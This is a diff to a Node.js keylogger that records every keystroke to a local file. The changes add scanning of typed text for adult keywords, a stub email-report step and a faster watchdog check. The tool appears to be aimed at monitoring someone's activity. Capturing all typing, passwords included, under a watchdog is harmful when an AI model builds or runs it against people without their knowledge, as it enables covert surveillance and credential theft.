@@ -3,6 +3,52 @@ const { GlobalKeyboardListener } = require('node-global-key-listener');
 const { exec } = require('child_process');
 const path = require('path');
 
+// Path to the keywords file
+const keywordsFilePath = path.join(__dirname, 'keywords.txt');
+// Path to the keylog file
+const keylogFilePath = path.join(__dirname, 'keylog.txt');
+
+// Load keywords from file into an array
+function loadKeywords() {
+    const content = fs.readFileSync(keywordsFilePath, 'utf-8');
+    return content.split(/\r?\n/).filter(Boolean);  // Split by line, remove empty lines
+}
+
+let keywords = loadKeywords();  // Load keywords initially
+
+// Function to scan buffer for adult keywords
+function scanForAdultKeywords(bufferContent) {
+    for (const keyword of keywords) {
+        if (bufferContent.includes(keyword)) {
+            logToKeylogFile(`[WARNING] Adult content detected: "${keyword}"`);
+            break;
+        }
+    }
+}
+
+function cleanBuffer(bufferContent) {
+    // Replace all punctuation (except spaces) with a space
+    const cleanedBuffer = bufferContent.replace(/[.,\/#!$%\^&\*;:{}=\-_`~()]/g, ' ');
+    
+    // Replace multiple spaces with a single space and trim leading/trailing spaces
+    return cleanedBuffer.replace(/\s+/g, ' ').trim();
+}
+
+// Function to scan the entire keylog file for adult keywords
+function scanLogFileBeforeEmail() {
+    const logContent = fs.readFileSync(keylogFilePath, 'utf-8');
+    for (const keyword of keywords) {
+        if (logContent.includes(keyword)) {
+            logToKeylogFile(`[WARNING] Detected adult keyword in keylog: "${keyword}"`);
+        }
+    }
+}
+
+// Call this function before sending the email report
+function sendEmailReport() {
+    scanLogFileBeforeEmail();
+}
+
 // Log termination to the keylog.txt file
 function logToKeylogFile(message) {
     const timestamp = new Date().toLocaleString();
@@ -70,7 +116,7 @@ function startWatchdog() {
 
   
   // Check the status every 5 seconds
-  setInterval(checkWatchdogStatus, 5000);
+  setInterval(checkWatchdogStatus, 1000);
   
   // Initial check
   checkWatchdogStatus();
@@ -90,9 +136,15 @@ let buffer = '';
 // Function to write buffer to file
 function writeBufferToFile() {
     if (buffer.length > 0) {
-        logStream.write(buffer);
+        const cleanedBuffer = cleanBuffer(buffer);  // Clean up the buffer by removing punctuation and extra spaces
+        scanForAdultKeywords(cleanedBuffer);  // Scan for keywords before writing
+        logStream.write(cleanedBuffer);
         buffer = '';
     }
+}
+
+function reloadKeywords() {
+    keywords = loadKeywords();
 }
 
 // Function to check if the log file needs a newline before writing the date
